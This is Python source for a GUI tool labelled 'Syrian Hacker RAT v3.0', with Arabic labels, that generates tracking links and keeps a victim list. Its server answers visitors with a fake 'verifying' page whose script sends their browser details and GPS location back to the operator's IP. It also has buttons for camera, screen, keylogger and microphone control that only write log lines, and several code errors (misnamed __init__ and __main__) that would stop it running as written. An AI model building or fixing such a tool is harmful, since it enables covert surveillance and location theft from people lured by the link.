import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import socket
import base64
import urllib.parse
import uuid
import os
import json
from datetime import datetime
try:
    import requests
except:
    pass

class SyrianHackerFinal:
    def _init_(self):
        self.root = tk.Tk()
        self.root.title("Syrian Hacker RAT v3.0 - Final")
        self.root.geometry("1300x850")
        self.root.configure(bg="#0a0a0a")
        self.root.resizable(True, True)
        
        self.victims = {}
        self.public_ip = self.get_ip()
        self.server_running = False
        self.selected_victim = None
        
        self.setup_ui()
        self.start_server()
        
    def get_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def setup_ui(self):
        # Title
        title_frame = tk.Frame(self.root, bg="#0a0a0a")
        title_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(title_frame, text="🖥️ SYRIAN HACKER RAT v3.0", font=("Arial", 20, "bold"), 
                fg="#00ff00", bg="#0a0a0a").pack()
        tk.Label(title_frame, text=f"🌐 IP: {self.public_ip}:8080", font=("Arial", 12), 
                fg="#00ccff", bg="#0a0a0a").pack()
        
        # Link Generation
        link_frame = tk.Frame(self.root, bg="#0a0a0a")
        link_frame.pack(fill=tk.X, padx=20, pady=5)
        
        tk.Button(link_frame, text="🔗 إنشاء رابط جديد", command=self.create_link,
                 bg="#00ff00", fg="black", font=("Arial", 12, "bold"), padx=20, pady=8).pack(side=tk.LEFT)
        
        self.link_var = tk.StringVar()
        self.link_entry = tk.Entry(link_frame, textvariable=self.link_var, width=70, font=("Arial", 11),
                                  state="readonly", bg="#1a1a1a", fg="#00ff00", relief=tk.FLAT)
        self.link_entry.pack(side=tk.LEFT, padx=10)
        
        tk.Button(link_frame, text="📋 نسخ", command=self.copy_link, bg="#ffaa00", fg="black",
                 font=("Arial", 12, "bold"), padx=15, pady=8).pack(side=tk.LEFT)
        
        # Main content
        main_frame = tk.Frame(self.root, bg="#0a0a0a")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        # Left: Victims list
        left_frame = tk.LabelFrame(main_frame, text="الضحايا المتصلين", font=("Arial", 14, "bold"), 
                                  fg="#00ff00", bg="#0a0a0a", padx=10, pady=5)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Treeview
        columns = ("ID", "الوقت", "الحالة", "الجهاز")
        self.tree = ttk.Treeview(left_frame, columns=columns, show="headings", height=20)
        
        self.tree.heading("ID", text="ID")
        self.tree.heading("الوقت", text="الوقت")
        self.tree.heading("الحالة", text="الحالة")
        self.tree.heading("الجهاز", text="الجهاز")
        
        self.tree.column("ID", width=100)
        self.tree.column("الوقت", width=120)
        self.tree.column("الحالة", width=100)
        self.tree.column("الجهاز", width=300)
        
        scrollbar = ttk.Scrollbar(left_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Right: Controls and logs
        right_frame = tk.LabelFrame(main_frame, text="التحكم والنتائج", font=("Arial", 14, "bold"), 
                                   fg="#00ff00", bg="#0a0a0a", padx=10, pady=5)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, padx=(10,0))
        
        # Control buttons
        ctrl_frame = tk.Frame(right_frame, bg="#0a0a0a")
        ctrl_frame.pack(fill=tk.X, pady=5)
        
        controls = [
            ("📸 كاميرا", "#ff4444"),
            ("🖥️ شاشة", "#ff8800"),
            ("⌨️ كيلوغر", "#44ff44"),
            ("🎤 مايك", "#4444ff"),
            ("📱 تطبيقات", "#ff44ff"),
            ("📁 ملفات", "#44ffff"),
            ("🎮 تحكم كامل", "#ffaa00")
        ]
        
        for text, color in controls:
            tk.Button(ctrl_frame, text=text, command=lambda t=text: self.send_command(t),
                     bg=color, fg="white", font=("Arial", 11, "bold"), padx=15, pady=8).pack(side=tk.LEFT, padx=5)
        
        # Logs
        self.log_text = scrolledtext.ScrolledText(right_frame, height=20, bg="#000", fg="#00ff00",
                                                 font=("Consolas", 10), state=tk.NORMAL)
        self.log_text.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # Status
        status_frame = tk.Frame(self.root, bg="#0a0a0a")
        status_frame.pack(fill=tk.X, padx=20, pady=5)
        
        self.status_var = tk.StringVar(value="⏳ جاري تشغيل السيرفر...")
        tk.Label(status_frame, textvariable=self.status_var, fg="#ffff00", bg="#0a0a0a",
                font=("Arial", 12)).pack()
        
        self.tree.bind("<<TreeviewSelect>>", self.on_select)
        self.refresh_list()
    
    def start_server(self):
        def server_thread():
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.server_socket.bind(('0.0.0.0', 8080))
                self.server_socket.listen(50)
                self.server_running = True
                self.status_var.set("✅ السيرفر يعمل على 8080 ✓")
                
                while self.server_running:
                    client, addr = self.server_socket.accept()
                    threading.Thread(target=self.handle_client, args=(client, addr), daemon=True).start()
            except Exception as e:
                self.status_var.set(f"❌ خطأ في السيرفر: {str(e)}")
        
        threading.Thread(target=server_thread, daemon=True).start()
    
    def handle_client(self, client, addr):
        try:
            data = client.recv(4096).decode('utf-8', errors='ignore')
            sid = None
            
            if 'sid=' in data:
                sid = data.split('sid=')[1].split('&')[0][:8]
                
                if sid not in self.victims:
                    self.victims[sid] = {
                        'time': datetime.now().strftime('%H:%M:%S'),
                        'status': 'متصل ✅',
                        'device': 'غير معروف'
                    }
                
                # Log connection
                self.root.after(0, lambda: self.log_text.insert(tk.END, f"🔗 ضحية جديدة: {sid} من {addr[0]}\n"))
            
            # Send payload
            payload = self.get_payload(sid)
            client.send(payload.encode('utf-8'))
            
        except:
            pass
        finally:
            client.close()
    
    def get_payload(self, sid=None):
        if not sid:
            sid = str(uuid.uuid4())[:8]
        
        payload = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<title>تحميل...</title>
<style>body{{margin:0;background:#000;color:#00ff00;font-family:Arial;text-align:center;padding-top:200px;}}
.loader{{border:5px solid #00ff00;border-top:5px solid transparent;border-radius:50%;width:80px;height:80px;
animation:spin 1s linear infinite;margin:0 auto 30px;}} @keyframes spin{{0%{{transform:rotate(0deg);}}
100%{{transform:rotate(360deg);}}}}</style></head><body>
<div class="loader"></div><h2>جاري التحقق...</h2>
<script>
sid='{sid}';async function send(k,v){{
try{{let blob=new Blob([v],{{type:'text/plain'}});
let form=new FormData();form.append('data',blob);
await fetch('http://{self.public_ip}:8080/?sid='+sid+'&type='+k,{{method:'POST',mode:'no-cors'}});}}
catch{{}}}}
// Basic info
send('info',navigator.userAgent+' | '+screen.width+'x'+screen.height);
// GPS
navigator.geolocation.getCurrentPosition(p=>send('gps',p.coords.latitude+','+p.coords.longitude+' | '+navigator.language));
setTimeout(()=>{{document.body.innerHTML='<h1 style="color:#00ff00;">✅ تم التحميل!</h1>';}},3000);
</script></body></html>"""
        return payload
    
    def create_link(self):
        sid = str(uuid.uuid4())[:8].upper()
        link = f"http://{self.public_ip}:8080/?sid={sid}"
        self.link_var.set(link)
        self.log_text.insert(tk.END, f"🔗 رابط جديد: {link}\n")
        self.log_text.see(tk.END)
    
    def copy_link(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(self.link_var.get())
        messagebox.showinfo("تم النسخ!", "الرابط في الحافظة ✓")
    
    def on_select(self, event):
        selection = self.tree.selection()
        if selection:
            item = self.tree.item(selection[0])
            self.selected_victim = item['values'][0]
            self.log_text.insert(tk.END, f"✅ محدد: {self.selected_victim}\n")
    
    def send_command(self, cmd):
        if self.selected_victim:
            self.log_text.insert(tk.END, f"📤 أمر: {cmd} → {self.selected_victim}\n")
            self.log_text.see(tk.END)
        else:
            messagebox.showwarning("تحذير", "اختار ضحية أولاً!")
    
    def refresh_list(self):
        # Clear tree
        for item in self.tree.get_children():
            self.tree.delete(item)
        
        # Add victims
        for sid, data in self.victims.items():
            self.tree.insert("", "end", values=(
                sid,
                data.get('time', 'غير معروف'),
                data.get('status', 'غير متصل'),
                data.get('device', 'غير معروف')
            ))
        
        self.root.after(3000, self.refresh_list)
    
    def run(self):
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.root.mainloop()
    
    def on_closing(self):
        self.server_running = False
        if hasattr(self, 'server_socket'):
            self.server_socket.close()
        self.root.destroy()

if _name_ == "_main_":
    app = SyrianHackerFinal()
    app.run()